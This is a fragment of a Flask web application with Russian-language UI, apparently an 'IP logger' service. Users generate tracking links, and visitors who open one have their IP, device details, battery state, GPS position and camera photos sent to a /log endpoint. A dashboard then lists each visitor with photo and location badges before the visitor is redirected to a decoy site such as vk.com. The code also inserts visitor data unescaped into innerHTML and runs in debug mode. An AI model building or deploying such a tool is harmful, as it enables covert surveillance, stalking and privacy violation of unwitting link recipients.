                for (var i = 0; i < visitors.length; i++) {
                    var v = visitors[i];
                    var hasPhoto = v.photo && v.photo.length > 100;
                    html += '<div class="visitor">' +
                        '<div class="head">' +
                            '<span class="ip">' + (v.ip || 'Unknown') + '</span>' +
                            '<span class="time">' + (v.timestamp || '') + '</span>' +
                        '</div>' +
                        '<div style="display:flex; flex-wrap:wrap; gap:4px; margin-bottom:4px;">' +
                            (v.country ? '<span class="badge badge-success">' + v.country + '</span>' : '') +
                            (v.city ? '<span class="badge badge-info">' + v.city + '</span>' : '') +
                            (v.gps_lat && v.gps_lat !== 'Denied' ? '<span class="badge badge-warning">📍 GPS</span>' : '') +
                            (hasPhoto ? '<span class="badge badge-success">📸 Фото</span>' : '') +
                            (v.gps_lat === 'Denied' ? '<span class="badge badge-danger">❌ Отказ</span>' : '') +
                        '</div>' +
                        '<div class="detail">📱 ' + (v.device_type || 'Unknown') + ' · ' + (v.os || 'Unknown') + ' · ' + (v.browser || 'Unknown') + '</div>' +
                        '<div class="detail">🖥️ ' + (v.screen || 'Unknown') + ' · ⏰ ' + (v.timezone || 'Unknown') + '</div>' +
                        '<div class="detail">🔋 ' + (v.battery_level || 'Unknown') + ' · ' + (v.battery_charging === 'Yes' ? '🔌 зарядка' : '🔋 не заряжается') + '</div>' +
                        (hasPhoto ? '<img src="' + v.photo + '" class="photo" />' : '<div class="photo-placeholder">📷 Нет фото</div>') +
                    '</div>';
                }
            }
            document.getElementById('visitorsList').innerHTML = html;
        });
}

function showToast(msg, isError) {
    var toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.className = 'toast show' + (isError ? ' error' : '');
    clearTimeout(toast._hide);
    toast._hide = setTimeout(function() { toast.classList.remove('show'); }, 2500);
}

loadSettings();
loadLinks();
loadStats();
setTimeout(generateLink, 500);
setInterval(function() { loadStats(); loadLinks(); }, 5000);
</script>
</body>
</html>
"""

# ============ МАРШРУТЫ ============

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('guest'):
            session['user_id'] = 'guest_' + str(uuid.uuid4())[:6]
            session['username'] = 'Гость'
            if session['user_id'] not in user_data:
                user_data[session['user_id']] = {'links': {}}
            return redirect('/dashboard')
        
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if username and password:
            session['user_id'] = username
            session['username'] = username
            if username not in user_data:
                user_data[username] = {'links': {}}
            return redirect('/dashboard')
        return render_template_string(LOGIN_HTML)
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/login')
    return render_template_string(DASHBOARD_HTML, username=session.get('username', 'User'))

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/settings', methods=['GET', 'POST'])
def settings_route():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id not in user_data:
        user_data[user_id] = {'links': {}}
    if request.method == 'POST':
        data = request.get_json()
        if data:
            user_data[user_id]['settings'] = data
        return jsonify({'status': 'ok'})
    else:
        return jsonify(user_data[user_id].get('settings', {
            'redirect': 'https://vk.com/',
            'geo': True,
            'camera': True
        }))

@app.route('/generate')
def generate():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id not in user_data:
        user_data[user_id] = {'links': {}}
    
    link_id = str(uuid.uuid4())[:8]
    user_data[user_id]['links'][link_id] = {
        'created': datetime.datetime.now().isoformat(),
        'logs': []
    }
    return jsonify({
        'id': link_id,
        'full_url': request.host_url.rstrip('/') + '/l/' + link_id,
        'visits': 0
    })

@app.route('/l/<link_id>')
def logger(link_id):
    found_user = None
    for uid, data in user_data.items():
        if link_id in data.get('links', {}):
            found_user = uid
            break
    if not found_user:
        return 'Ссылка не найдена', 404
    
    settings = user_data[found_user].get('settings', {
        'redirect': 'https://vk.com/',
        'geo': True,
        'camera': True
    })
    
    return render_template_string(LOGGER_HTML, link_id=link_id, settings=settings)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400
    link_id = data.get('link_id')
    if not link_id:
        return jsonify({'error': 'No link_id'}), 400
    
    for uid, udata in user_data.items():
        if link_id in udata.get('links', {}):
            udata['links'][link_id]['logs'].append(data)
            return jsonify({'status': 'ok'})
    return jsonify({'error': 'Link not found'}), 404

@app.route('/links')
def get_links():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id not in user_data:
        user_data[user_id] = {'links': {}}
    
    links = []
    for link_id, link_data in user_data[user_id]['links'].items():
        links.append({
            'id': link_id,
            'full_url': request.host_url.rstrip('/') + '/l/' + link_id,
            'created': link_data.get('created', '')
        })
    visits = {}
    for link_id, link_data in user_data[user_id]['links'].items():
        visits[link_id] = len(link_data.get('logs', []))
    return jsonify({'links': links, 'visits': visits})

@app.route('/stats/all')
def stats_all():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id not in user_data:
        user_data[user_id] = {'links': {}}
    
    all_visitors = []
    for link_data in user_data[user_id]['links'].values():
        all_visitors.extend(link_data.get('logs', []))
    
    unique_ips = len(set(v.get('ip') for v in all_visitors if v.get('ip')))
    with_photo = sum(1 for v in all_visitors if v.get('photo') and len(v.get('photo', '')) > 100)
    with_geo = sum(1 for v in all_visitors if v.get('gps_lat') and v.get('gps_lat') not in ['Denied', 'Disabled', 'Pending'])
    
    return jsonify({
        'visitors': all_visitors[-50:],
        'total_visits': len(all_visitors),
        'unique_ips': unique_ips,
        'with_photo': with_photo,
        'with_geo': with_geo
    })

@app.route('/stats/<link_id>')
def stats_link(link_id):
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id not in user_data:
        user_data[user_id] = {'links': {}}
    
    link_data = user_data[user_id]['links'].get(link_id)
    if not link_data:
        return jsonify({'error': 'Link not found'}), 404
    
    visitors = link_data.get('logs', [])
    unique_ips = len(set(v.get('ip') for v in visitors if v.get('ip')))
    with_photo = sum(1 for v in visitors if v.get('photo') and len(v.get('photo', '')) > 100)
    with_geo = sum(1 for v in visitors if v.get('gps_lat') and v.get('gps_lat') not in ['Denied', 'Disabled', 'Pending'])
    
    return jsonify({
        'visitors': visitors[-50:],
        'total_visits': len(visitors),
        'unique_ips': unique_ips,
        'with_photo': with_photo,
        'with_geo': with_geo
    })

@app.route('/delete/<link_id>', methods=['POST'])
def delete_link(link_id):
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id in user_data and link_id in user_data[user_id].get('links', {}):
        del user_data[user_id]['links'][link_id]
    return jsonify({'status': 'ok'})

@app.route('/clear', methods=['POST'])
def clear():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id in user_data:
        user_data[user_id]['links'] = {}
    return jsonify({'status': 'ok'})

@app.route('/export')
def export():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    if user_id not in user_data:
        user_data[user_id] = {'links': {}}
    return jsonify(user_data[user_id]['links'])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
